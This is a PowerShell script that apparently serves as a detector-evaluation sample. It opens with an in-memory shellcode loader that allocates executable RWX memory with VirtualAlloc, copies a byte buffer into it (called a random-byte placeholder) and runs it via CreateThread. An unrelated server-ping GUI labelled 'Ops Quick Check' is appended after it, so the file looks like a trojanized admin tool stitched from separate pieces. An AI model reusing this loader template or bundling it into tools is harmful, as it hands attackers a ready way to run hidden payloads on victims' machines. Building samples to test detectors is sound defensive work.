
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x5b, 0x2c, 0x4a, 0x92, 0xd1, 0x39, 0x62, 0x91, 0x30, 0xaa, 0xfd, 0xdd, 0xce, 0x94, 0xd6, 0x5a,
    0x3e, 0xa9, 0xa5, 0x8d, 0x62, 0x80, 0xd1, 0x09, 0x90, 0xb7, 0xc5, 0x99, 0x00, 0x1e, 0x7c, 0x2c,
    0xa8, 0x30, 0x0b, 0x5a, 0xf9, 0x16, 0x8a, 0x48, 0xc3, 0xed, 0x06, 0xaf, 0xe3, 0xae, 0x7c, 0x38,
    0xf5, 0x02, 0xfd, 0xde, 0x8d, 0xd1, 0x33, 0x16, 0x15, 0x6b, 0x99, 0x51, 0x77, 0xb3, 0x6f, 0x02,
    0x30, 0x98, 0xe9, 0x45, 0x9a, 0x13, 0x5a, 0xfc, 0x9f, 0x89, 0xc8, 0xc5, 0x27, 0x17, 0xae, 0xdf,
    0x81, 0x67, 0xc9, 0x86, 0x8a, 0x15, 0x14, 0xd2, 0x47, 0x49, 0x8e, 0xb4, 0x8c, 0xe1, 0xac, 0x54,
    0x16, 0xe3, 0x6c, 0xf4, 0x0e, 0xd3, 0x05, 0x0c, 0x7e, 0x56, 0xd6, 0x21, 0x05, 0x8c, 0x82, 0x7f,
    0x2d, 0xd9, 0x8f, 0x00, 0x2b, 0x9e, 0x31, 0xb7, 0x81, 0xb5, 0xec, 0x8c, 0x32, 0x70, 0x31, 0xb4,
    0x60, 0x35, 0x77, 0x63, 0x7f, 0x61, 0x14, 0xde, 0x7b, 0x9c, 0x6f, 0x5f, 0x8d, 0xdb, 0xf2, 0x68,
    0x42, 0xcf, 0xec, 0x79, 0x45, 0xae, 0xbf, 0xec, 0x9e, 0x2f, 0xa2, 0x15, 0x85, 0x38, 0xb8, 0xf7,
    0x45, 0xb0, 0x67, 0x52, 0x89, 0x9d, 0x86, 0xa8, 0x24, 0xf2, 0x40, 0x4f, 0x14, 0xb3, 0xaf, 0x7b,
    0x91, 0x4c, 0x16, 0xb2, 0xca, 0xbe, 0xa1, 0xdd, 0xd6, 0xa6, 0xd7, 0x8d, 0x6a, 0x2d, 0xd9, 0x49,
    0xe6, 0xc0, 0xcf, 0x08, 0x05, 0x90, 0x35, 0x3a, 0xed, 0xbc, 0xd4, 0x87, 0xb9, 0x76, 0x1c, 0x47,
    0x04, 0x8e, 0xde, 0xc1, 0x00, 0x4a, 0x85, 0x01, 0x8c, 0xec, 0x64, 0x03, 0xf7, 0x3c, 0xe5, 0x50,
    0xc0, 0x56, 0x30, 0xe0, 0xe8, 0x88, 0x98, 0x25, 0xa5, 0x88, 0xfa, 0x1b, 0x78, 0x14, 0x6c, 0x41,
    0x4a, 0xd9, 0x31, 0x82, 0x6c, 0x54, 0x79, 0xc7, 0x31, 0x13, 0x30, 0xa2, 0xf7, 0x34, 0xcb, 0x2e,
    0x0c, 0x3f, 0x01, 0x46, 0x5c, 0x52, 0x9d, 0x96, 0x76, 0xce, 0x41, 0x3c, 0x40, 0x96, 0x61, 0xb2,
    0xa8, 0x7b, 0xee, 0xc9, 0x3c, 0xd3, 0xff, 0xef, 0xbc, 0xef, 0x1f, 0x2f, 0x4e, 0x38, 0xb0, 0x70,
    0x5e, 0x0d, 0x92, 0xe9, 0xa6, 0x32, 0x80, 0x23, 0xf7, 0xb4, 0x08, 0xf2, 0x3e, 0x24, 0xd6, 0x35,
    0x13, 0x9a, 0x23, 0x7c, 0x94, 0x0a, 0x73, 0x30, 0x92, 0x71, 0x2e, 0x7a, 0xb0, 0xe9, 0x7e, 0x7a,
    0xf0, 0x86
)

$ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 755)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Ops Quick Check'
$form.Size = New-Object System.Drawing.Size(860, 600)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc02', 'mgmt01', 'dc01')
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = "Probe"
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)

foreach ($server in $script:servers) {
    [void]$listBox.Items.Add($server)
}

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()
